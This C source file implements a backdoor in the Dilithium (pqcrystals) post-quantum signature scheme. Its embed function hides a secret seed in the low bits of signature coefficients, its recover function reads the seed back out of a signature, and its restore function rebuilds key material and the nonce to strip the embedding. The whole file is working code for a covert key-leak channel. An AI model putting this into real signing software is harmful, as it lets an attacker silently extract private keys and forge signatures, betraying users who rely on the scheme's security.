#include "transform.h"

void pqcrystals_dilithium_backdoor_embed(polyvecl *z, const uint8_t *hidden_seed) {
	for(unsigned int i = 0; i < N; ++i) {
		uint8_t seed_i  = (hidden_seed[i >> 3] >> (i & 7)) & 1u;
		uint8_t zi_mod2 = (uint8_t)(((uint32_t)z->vec[0].coeffs[i]) & 1u);

		if(zi_mod2 != seed_i)
			z->vec[0].coeffs[i] += seed_i == 0 ? 1 : -1;
	}
	poly_reduce(&z->vec[0]);
}

void pqcrystals_dilithium_backdoor_recover(const polyvecl *z, uint8_t *extracted_seed) {
	for(unsigned int i = 0; i < SEEDBYTES; ++i) {
		extracted_seed[i] = 0;
		for(unsigned int j = 0; j < 8; ++j) {
			uint8_t bit = (uint8_t)(((uint32_t)z->vec[0].coeffs[i * 8 + j]) & 1u);
			extracted_seed[i] |= (bit << j);
		}
	}
}

int pqcrystals_dilithium_backdoor_restore(
    polyvecl *z,
    const uint8_t *hidden_seed,
    const uint8_t *mu,
    const poly *cp)
{
	uint8_t seedbuf[2*SEEDBYTES + CRHBYTES];
	uint8_t rhoprime_signing[CRHBYTES];
	const uint8_t rnd[SEEDBYTES] = {0};
	polyvecl s1, y, z_cand;
	poly cp_ntt;
	keccak_state state;

	// 1. Re-derive keygen material: shake256(seed || K || L)
	memcpy(seedbuf, hidden_seed, SEEDBYTES);
	seedbuf[SEEDBYTES+0] = K;
	seedbuf[SEEDBYTES+1] = L;
	shake256(seedbuf, 2*SEEDBYTES + CRHBYTES, seedbuf, SEEDBYTES+2);

	// 2. Reconstruct s1 in NTT domain
	polyvecl_uniform_eta(&s1, seedbuf + SEEDBYTES, 0);
	polyvecl_ntt(&s1);

	// 3. Derive signing rhoprime = SHAKE256(key || rnd=0 || mu)
	shake256_init(&state);
	shake256_absorb(&state, seedbuf + SEEDBYTES + CRHBYTES, SEEDBYTES); /* key at 96+ */
	shake256_absorb(&state, rnd, SEEDBYTES);
	shake256_absorb(&state, mu, CRHBYTES);
	shake256_finalize(&state);
	shake256_squeeze(rhoprime_signing, CRHBYTES, &state);

	// 4. Prepare cp in NTT domain. cp arrives in coeff domain from poly_challenge().
	cp_ntt = *cp;
	poly_ntt(&cp_ntt);

	/*
	* 5. Search for the correct nonce.
	* Regenerate z = y + c * s1 (as the function crypto_sign_signature_internal does)
	* and compare vec[1] (unmodified by embed) to identify which nonce the signer used.
	*/
	for(uint16_t nonce = 0; nonce < 100u; ++nonce) {
		polyvecl_uniform_gamma1(&y, rhoprime_signing, nonce);

		// z_cand = c*s1 (NTT) -> invntt -> + y, matching sign.c lines 213-216
		polyvecl_pointwise_poly_montgomery(&z_cand, &cp_ntt, &s1);
		polyvecl_invntt_tomont(&z_cand);
		polyvecl_add(&z_cand, &z_cand, &y);
		polyvecl_reduce(&z_cand);

		// 5. Check all untouched vectors (vec[1]..vec[L-1]) to find correct nonce
		int integrity_ok = 1;
		for(unsigned int k = 1; k < L && integrity_ok; ++k) {
			for(unsigned int i = 0; i < N && integrity_ok; ++i) {
				if(z_cand.vec[k].coeffs[i] != z->vec[k].coeffs[i])
					integrity_ok = 0;
			}
		}

		if(integrity_ok) {
			int embed_ok = 1;

			/* Check vec[0]: each coeff should match z_cand + embed adjustment */
			for(unsigned int i = 0; i < N && embed_ok; ++i) {
				uint8_t seed_bit  = (hidden_seed[i >> 3] >> (i & 7)) & 1u;
				int32_t z_clean   = z_cand.vec[0].coeffs[i];
				int32_t z_dirty   = z->vec[0].coeffs[i];
				uint8_t clean_lsb = (uint8_t)(((uint32_t)z_clean) & 1u);
				int32_t expected  = (clean_lsb == seed_bit)
				                    ? z_clean
				                    : z_clean + (seed_bit == 0 ? 1 : -1);
				if(z_dirty != expected)
					embed_ok = 0;
			}

			if(embed_ok) {
				z->vec[0] = z_cand.vec[0];
				return 0;
			}
		}
	}

	return -1;
}